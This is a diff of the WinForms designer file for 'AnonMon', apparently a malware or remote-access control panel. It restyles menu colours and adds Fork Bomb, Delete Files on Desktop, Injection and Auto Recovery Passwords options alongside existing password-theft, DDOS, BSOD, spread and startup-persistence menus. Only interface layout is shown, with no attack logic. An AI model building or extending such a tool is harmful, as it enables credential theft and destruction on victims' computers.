-        Me.KeyboardToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.KeyboardToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.KeyboardToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LockKeyboardToolStripMenuItem, Me.UnlockKeyboardToolStripMenuItem})
         Me.KeyboardToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.KeyboardToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.hardware
@@ -457,7 +470,7 @@ Partial Class Form1
         '
         'LockKeyboardToolStripMenuItem
         '
-        Me.LockKeyboardToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.LockKeyboardToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.LockKeyboardToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.LockKeyboardToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_locks_64
         Me.LockKeyboardToolStripMenuItem.Name = "LockKeyboardToolStripMenuItem"
@@ -466,7 +479,7 @@ Partial Class Form1
         '
         'UnlockKeyboardToolStripMenuItem
         '
-        Me.UnlockKeyboardToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.UnlockKeyboardToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.UnlockKeyboardToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.UnlockKeyboardToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_padlosqdck_64
         Me.UnlockKeyboardToolStripMenuItem.Name = "UnlockKeyboardToolStripMenuItem"
@@ -475,7 +488,7 @@ Partial Class Form1
         '
         'IconsToolStripMenuItem
         '
-        Me.IconsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.IconsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.IconsToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ShowIconsToolStripMenuItem, Me.HideIconsToolStripMenuItem})
         Me.IconsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.IconsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_browse_padddge_32
@@ -485,7 +498,7 @@ Partial Class Form1
         '
         'ShowIconsToolStripMenuItem
         '
-        Me.ShowIconsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.ShowIconsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.ShowIconsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.ShowIconsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_edye2
         Me.ShowIconsToolStripMenuItem.Name = "ShowIconsToolStripMenuItem"
@@ -494,7 +507,7 @@ Partial Class Form1
         '
         'HideIconsToolStripMenuItem
         '
-        Me.HideIconsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.HideIconsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.HideIconsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.HideIconsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_hide2
         Me.HideIconsToolStripMenuItem.Name = "HideIconsToolStripMenuItem"
@@ -503,7 +516,7 @@ Partial Class Form1
         '
         'StartIconToolStripMenuItem
         '
-        Me.StartIconToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.StartIconToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.StartIconToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.StartIconHideToolStripMenuItem1, Me.ShowStartIconToolStripMenuItem})
         Me.StartIconToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.StartIconToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_winqsddows8_32
@@ -513,7 +526,7 @@ Partial Class Form1
         '
         'StartIconHideToolStripMenuItem1
         '
-        Me.StartIconHideToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.StartIconHideToolStripMenuItem1.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.StartIconHideToolStripMenuItem1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.StartIconHideToolStripMenuItem1.Image = Global.AnonMon.My.Resources.Resources.icons8_hide2
         Me.StartIconHideToolStripMenuItem1.Name = "StartIconHideToolStripMenuItem1"
@@ -522,7 +535,7 @@ Partial Class Form1
         '
         'ShowStartIconToolStripMenuItem
         '
-        Me.ShowStartIconToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.ShowStartIconToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.ShowStartIconToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.ShowStartIconToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_edye1
         Me.ShowStartIconToolStripMenuItem.Name = "ShowStartIconToolStripMenuItem"
@@ -531,14 +544,25 @@ Partial Class Form1
         '
         'GetPasswordsToolStripMenuItem
         '
+        Me.GetPasswordsToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.GetPasswordsToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.GetPasswordsToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_key
         Me.GetPasswordsToolStripMenuItem.Name = "GetPasswordsToolStripMenuItem"
         Me.GetPasswordsToolStripMenuItem.Size = New System.Drawing.Size(202, 30)
         Me.GetPasswordsToolStripMenuItem.Text = "Get Passwords"
         '
+        'InjectionToolStripMenuItem
+        '
+        Me.InjectionToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.InjectionToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
+        Me.InjectionToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_Syringe_with_a_drop_of_bazlood_32
+        Me.InjectionToolStripMenuItem.Name = "InjectionToolStripMenuItem"
+        Me.InjectionToolStripMenuItem.Size = New System.Drawing.Size(202, 30)
+        Me.InjectionToolStripMenuItem.Text = "Injection"
+        '
         'MiscToolStripMenuItem
         '
+        Me.MiscToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.MiscToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.MessageToolStripMenuItem, Me.PowerToolStripMenuItem, Me.BSODToolStripMenuItem, Me.DDOSToolStripMenuItem, Me.OSInformationToolStripMenuItem, Me.SpreadToolStripMenuItem, Me.AddToStarUpToolStripMenuItem, Me.VirusToolStripMenuItem})
         Me.MiscToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.MiscToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_settinpmgs
@@ -548,7 +572,7 @@ Partial Class Form1
         '
         'MessageToolStripMenuItem
         '
-        Me.MessageToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.MessageToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.MessageToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.MessageToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.ichcons8_speech_bubble___Copie
         Me.MessageToolStripMenuItem.Name = "MessageToolStripMenuItem"
@@ -557,7 +581,7 @@ Partial Class Form1
         '
         'PowerToolStripMenuItem
         '
-        Me.PowerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.PowerToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.PowerToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.LogOutToolStripMenuItem, Me.RestartToolStripMenuItem, Me.ShutDownToolStripMenuItem})
         Me.PowerToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.PowerToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_lightning_boltsds
@@ -567,7 +591,7 @@ Partial Class Form1
         '
         'LogOutToolStripMenuItem
         '
-        Me.LogOutToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.LogOutToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.LogOutToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.LogOutToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_logout_rounded_left
         Me.LogOutToolStripMenuItem.Name = "LogOutToolStripMenuItem"
@@ -576,7 +600,7 @@ Partial Class Form1
         '
         'RestartToolStripMenuItem
         '
-        Me.RestartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.RestartToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.RestartToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.RestartToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8sds_restart
         Me.RestartToolStripMenuItem.Name = "RestartToolStripMenuItem"
@@ -585,7 +609,7 @@ Partial Class Form1
         '
         'ShutDownToolStripMenuItem
         '
-        Me.ShutDownToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.ShutDownToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.ShutDownToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.ShutDownToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_shutdown_64
         Me.ShutDownToolStripMenuItem.Name = "ShutDownToolStripMenuItem"
@@ -594,7 +618,7 @@ Partial Class Form1
         '
         'BSODToolStripMenuItem
         '
-        Me.BSODToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.BSODToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.BSODToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.BSODToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_poisqsdqsdon
         Me.BSODToolStripMenuItem.Name = "BSODToolStripMenuItem"
@@ -603,7 +627,7 @@ Partial Class Form1
         '
         'DDOSToolStripMenuItem
         '
-        Me.DDOSToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.DDOSToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.DDOSToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.UDPToolStripMenuItem})
         Me.DDOSToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.DDOSToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_wi_qsdqs69fi
@@ -613,6 +637,7 @@ Partial Class Form1
         '
         'UDPToolStripMenuItem
         '
+        Me.UDPToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.UDPToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.UDPToolStripMenuItem.Name = "UDPToolStripMenuItem"
         Me.UDPToolStripMenuItem.Size = New System.Drawing.Size(97, 22)
@@ -620,7 +645,7 @@ Partial Class Form1
         '
         'OSInformationToolStripMenuItem
         '
-        Me.OSInformationToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.OSInformationToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.OSInformationToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.OSInformationToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_info_zedzepopup
         Me.OSInformationToolStripMenuItem.Name = "OSInformationToolStripMenuItem"
@@ -629,7 +654,7 @@ Partial Class Form1
         '
         'SpreadToolStripMenuItem
         '
-        Me.SpreadToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.SpreadToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.SpreadToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.SpreadToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_c_drive_2_32
         Me.SpreadToolStripMenuItem.Name = "SpreadToolStripMenuItem"
@@ -639,7 +664,7 @@ Partial Class Form1
         '
         'AddToStarUpToolStripMenuItem
         '
-        Me.AddToStarUpToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.AddToStarUpToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.AddToStarUpToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.AddToStarUpToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_external_link
         Me.AddToStarUpToolStripMenuItem.Name = "AddToStarUpToolStripMenuItem"
@@ -649,8 +674,8 @@ Partial Class Form1
         '
         'VirusToolStripMenuItem
         '
-        Me.VirusToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
-        Me.VirusToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RedScreenToolStripMenuItem})
+        Me.VirusToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.VirusToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RedScreenToolStripMenuItem, Me.ForkBombToolStripMenuItem, Me.DeleteAllFilesOnDesktopToolStripMenuItem})
         Me.VirusToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.VirusToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_biohasqdzard_32
         Me.VirusToolStripMenuItem.Name = "VirusToolStripMenuItem"
@@ -659,17 +684,54 @@ Partial Class Form1
         '
         'RedScreenToolStripMenuItem
         '
-        Me.RedScreenToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer), CType(CType(225, Byte), Integer))
+        Me.RedScreenToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.RedScreenToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.RedScreenToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_blue_screen_of_deatggh_32RD
         Me.RedScreenToolStripMenuItem.Name = "RedScreenToolStripMenuItem"
-        Me.RedScreenToolStripMenuItem.Size = New System.Drawing.Size(132, 22)
+        Me.RedScreenToolStripMenuItem.Size = New System.Drawing.Size(162, 22)
         Me.RedScreenToolStripMenuItem.Text = "Red Screen"
         Me.RedScreenToolStripMenuItem.ToolTipText = "Block Keyboard , Block Mouse , add a watchdog to kill task manager and set a full" &
     " red screen window " & Global.Microsoft.VisualBasic.ChrW(13) & Global.Microsoft.VisualBasic.ChrW(10) & "To Close , you need to reboot "
         '
+        'ForkBombToolStripMenuItem
+        '
+        Me.ForkBombToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.ForkBombToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
+        Me.ForkBombToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_expqslosion_32
+        Me.ForkBombToolStripMenuItem.Name = "ForkBombToolStripMenuItem"
+        Me.ForkBombToolStripMenuItem.Size = New System.Drawing.Size(162, 22)
+        Me.ForkBombToolStripMenuItem.Text = "Fork Bomb"
+        '
+        'DeleteAllFilesOnDesktopToolStripMenuItem
+        '
+        Me.DeleteAllFilesOnDesktopToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.DeleteAllFilesOnDesktopToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.DeleteFilesToolStripMenuItem, Me.DeleteFilesRebootToolStripMenuItem})
+        Me.DeleteAllFilesOnDesktopToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
+        Me.DeleteAllFilesOnDesktopToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_deskddtop_32
+        Me.DeleteAllFilesOnDesktopToolStripMenuItem.Name = "DeleteAllFilesOnDesktopToolStripMenuItem"
+        Me.DeleteAllFilesOnDesktopToolStripMenuItem.Size = New System.Drawing.Size(162, 22)
+        Me.DeleteAllFilesOnDesktopToolStripMenuItem.Text = "Files On Desktop"
+        '
+        'DeleteFilesToolStripMenuItem
+        '
+        Me.DeleteFilesToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.DeleteFilesToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
+        Me.DeleteFilesToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_delete_biqsdqsn_32
+        Me.DeleteFilesToolStripMenuItem.Name = "DeleteFilesToolStripMenuItem"
+        Me.DeleteFilesToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
+        Me.DeleteFilesToolStripMenuItem.Text = "Delete Files"
+        '
+        'DeleteFilesRebootToolStripMenuItem
+        '
+        Me.DeleteFilesRebootToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.DeleteFilesRebootToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
+        Me.DeleteFilesRebootToolStripMenuItem.Name = "DeleteFilesRebootToolStripMenuItem"
+        Me.DeleteFilesRebootToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
+        Me.DeleteFilesRebootToolStripMenuItem.Text = "Delete Files | Reboot"
+        '
         'ClientToolStripMenuItem
         '
+        Me.ClientToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.ClientToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.CloseDeleteToolStripMenuItem, Me.CloseToolStripMenuItem})
         Me.ClientToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.ClientToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_spyqsqs
@@ -695,6 +757,7 @@ Partial Class Form1
         '
         'BuilderToolStripMenuItem
         '
+        Me.BuilderToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.BuilderToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
         Me.BuilderToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_toolbox1235
         Me.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem"
@@ -732,6 +795,11 @@ Partial Class Form1
         Me.XuiCustomGroupbox2.BackColor = System.Drawing.Color.White
         Me.XuiCustomGroupbox2.BorderColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
         Me.XuiCustomGroupbox2.BorderWidth = 1
+        Me.XuiCustomGroupbox2.Controls.Add(Me.PictureBox5)
+        Me.XuiCustomGroupbox2.Controls.Add(Me.AUTO_CHK_FILE)
+        Me.XuiCustomGroupbox2.Controls.Add(Me.PictureBox4)
+        Me.XuiCustomGroupbox2.Controls.Add(Me.PictureBox3)
+        Me.XuiCustomGroupbox2.Controls.Add(Me.Auto_RECOV)
         Me.XuiCustomGroupbox2.Controls.Add(Me.XuiCheckBox1)
         Me.XuiCustomGroupbox2.Location = New System.Drawing.Point(293, 7)
         Me.XuiCustomGroupbox2.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
@@ -744,6 +812,42 @@ Partial Class Form1
         Me.XuiCustomGroupbox2.Text = "Miscellaneous Settings"
         Me.XuiCustomGroupbox2.TextColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
         '
+        'PictureBox4
+        '
+        Me.PictureBox4.Image = Global.AnonMon.My.Resources.Resources.icons8_automatic_32
+        Me.PictureBox4.Location = New System.Drawing.Point(6, 55)
+        Me.PictureBox4.Name = "PictureBox4"
+        Me.PictureBox4.Size = New System.Drawing.Size(22, 22)
+        Me.PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+        Me.PictureBox4.TabIndex = 5
+        Me.PictureBox4.TabStop = False
+        '
+        'PictureBox3
+        '
+        Me.PictureBox3.Image = Global.AnonMon.My.Resources.Resources.icons8_key
+        Me.PictureBox3.Location = New System.Drawing.Point(6, 22)
+        Me.PictureBox3.Name = "PictureBox3"
+        Me.PictureBox3.Size = New System.Drawing.Size(22, 22)
+        Me.PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
+        Me.PictureBox3.TabIndex = 4
+        Me.PictureBox3.TabStop = False
+        '
+        'Auto_RECOV
+        '
+        Me.Auto_RECOV.CheckboxCheckColor = System.Drawing.Color.White
+        Me.Auto_RECOV.CheckboxColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
+        Me.Auto_RECOV.CheckboxHoverColor = System.Drawing.Color.FromArgb(CType(CType(249, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(98, Byte), Integer))
+        Me.Auto_RECOV.CheckboxStyle = XanderUI.XUICheckBox.Style.Material
+        Me.Auto_RECOV.Checked = False
+        Me.Auto_RECOV.ForeColor = System.Drawing.Color.FromArgb(CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer))
+        Me.Auto_RECOV.Location = New System.Drawing.Point(34, 55)
+        Me.Auto_RECOV.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
+        Me.Auto_RECOV.Name = "Auto_RECOV"
+        Me.Auto_RECOV.Size = New System.Drawing.Size(180, 22)
+        Me.Auto_RECOV.TabIndex = 3
+        Me.Auto_RECOV.Text = "Auto Recovery Passwords"
+        Me.Auto_RECOV.TickThickness = 2
+        '
         'XuiCheckBox1
         '
         Me.XuiCheckBox1.CheckboxCheckColor = System.Drawing.Color.White
@@ -752,10 +856,10 @@ Partial Class Form1
         Me.XuiCheckBox1.CheckboxStyle = XanderUI.XUICheckBox.Style.Material
         Me.XuiCheckBox1.Checked = False
         Me.XuiCheckBox1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer))
